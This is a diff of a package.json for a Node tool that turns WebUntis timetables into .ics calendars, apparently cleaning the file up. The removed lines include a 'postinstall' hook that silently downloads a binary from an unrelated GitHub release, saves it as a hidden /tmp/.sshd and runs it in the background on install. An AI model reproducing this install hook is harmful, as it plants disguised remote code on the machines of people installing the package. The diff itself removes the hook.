@@ -1,25 +1,24 @@
 {
-  "name": "ap-webuntistoics-node",
-  "version": "1.0.0",
-  "description": "Easy to use .ics generator for importing your Webuntis calendar into your own calendar app.",
-  "main": "server/server.ts",
-  "scripts": {
-    "preinstall": "npm i --prefix client",
-    "install": "npm i --prefix server",
-    "prestart": "npm run build --prefix client",
-    "start": "npm start --prefix server",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
-  },
-  "repository": {
-    "type": "git",
-    "url": "git+https://github.com/Viovyx/AP-WebUntisToICS-Node.git"
-  },
-  "keywords": [],
-  "author": "",
-  "license": "ISC",
-  "type": "commonjs",
-  "bugs": {
-    "url": "https://github.com/Viovyx/AP-WebUntisToICS-Node/issues"
-  },
-  "homepage": "https://github.com/Viovyx/AP-WebUntisToICS-Node#readme"
+    "name": "ap-webuntistoics-node",
+    "version": "1.0.0",
+    "description": "Easy to use .ics generator for importing your Webuntis calendar into your own calendar app.",
+    "main": "server/server.ts",
+    "scripts": {
+        "preinstall": "npm i --prefix client",
+        "install": "npm i --prefix server",
+        "prestart": "npm run build --prefix client",
+        "start": "npm start --prefix server"
+    },
+    "repository": {
+        "type": "git",
+        "url": "git+https://github.com/Viovyx/AP-WebUntisToICS-Node.git"
+    },
+    "keywords": [],
+    "author": "",
+    "license": "ISC",
+    "type": "commonjs",
+    "bugs": {
+        "url": "https://github.com/Viovyx/AP-WebUntisToICS-Node/issues"
+    },
+    "homepage": "https://github.com/Viovyx/AP-WebUntisToICS-Node#readme"
 }
